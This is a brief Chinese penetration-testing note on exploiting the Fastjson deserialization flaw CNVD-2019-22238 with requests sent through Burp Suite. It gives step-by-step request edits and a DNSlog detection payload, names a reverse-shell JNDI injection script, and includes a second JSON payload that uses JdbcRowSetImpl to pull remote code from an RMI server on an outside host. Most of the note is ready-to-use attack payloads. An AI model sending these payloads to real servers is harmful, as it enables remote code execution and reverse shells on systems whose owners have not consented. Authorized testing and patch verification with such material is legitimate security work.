# 漏洞验证, bp 发包
fastjson-cnvd_2019_22238

```sh
# 1. 改POST
POST / HTTP/1.1
# 2. 改application/json
Content-Type: application/json

# 3. body里按下面填
{"x":{"@type":"java.net.Inet4Address","val":"2i9ehz.dnslog.cn"}}
```

使用 web_exp_reverse_shell_fastjson_jndi_JNDI-Injection-Exploit_fast.py


# payload2

```json
{
 "1": {
 "@type": "java.lang.Class", 
 "val": "com.sun.rowset.JdbcRowSetImpl"
 }, 
 "2": {
 "@type": "com.sun.rowset.JdbcRowSetImpl", 
 "dataSourceName": "rmi://192.168.1.13:1099/v4v9uh", 
 "autoCommit": true
 }
}
```


[FastJson1.68&1.80版本反序列化利用](https://mp.weixin.qq.com/s/0C5Bny9LxRP62lTq3jRrvQ)
[fastjson-BCEL不出网打法原理分析](https://mp.weixin.qq.com/s/OwuCNHd9dU6sRMTwLnifCw)
